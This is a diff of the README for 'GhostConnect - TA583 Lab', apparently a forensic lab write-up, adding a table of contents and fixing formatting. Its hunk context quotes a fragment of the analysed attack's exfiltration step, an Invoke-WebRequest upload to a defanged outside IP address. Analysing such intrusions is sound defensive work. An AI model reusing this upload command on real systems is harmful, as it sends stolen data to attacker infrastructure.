@@ -1,6 +1,31 @@
 # GhostConnect - TA583 Lab
 
-![image.png](image.png)
+<p align="center">
+  <img src="image.png" alt="image.png">
+</p>
+
+# Table of Contents
+- [Context](#context)
+- [Scenario](#scenario)
+- [Initial Access](#initial-access)
+  * [Mark of the Web MOTW](#mark-of-the-web-motw)
+- [Execution](#execution)
+- [Command and Control](#command-and-control)
+  * [Empty IMPHASH Malicious Indicator](#empty-imphash-malicious-indicator)
+- [Persistence](#persistence)
+- [Collection](#collection)
+- [Exfiltration](#exfiltration)
+- [Attack Chain](#attack-chain)
+  * [Text Tree](#text-tree)
+- [Artifacts and IOCs](#artifacts-and-iocs)
+  * [Infrastructure](#infrastructure)
+  * [URLs](#urls)
+  * [Files](#files)
+  * [Persistence](#persistence-1)
+  * [Chrome Artifacts](#chrome-artifacts)
+  * [Victim](#victim)
+- [Lab Insights](#lab-insights)
+- [Forensic Timeline](#forensic-timeline)
 
 # Context
 
@@ -517,7 +542,7 @@ Invoke-WebRequest -Uri 'https://52[.]59[.]253[.]168/upload' `
                                             └── 0x001900000002b4b5-36.msi dropped + overwritten (16:33:24–16:35:48)  ← persistence
 ```
 
-# Artifacts & IOCs
+# Artifacts and IOCs
 
 ## Infrastructure
 
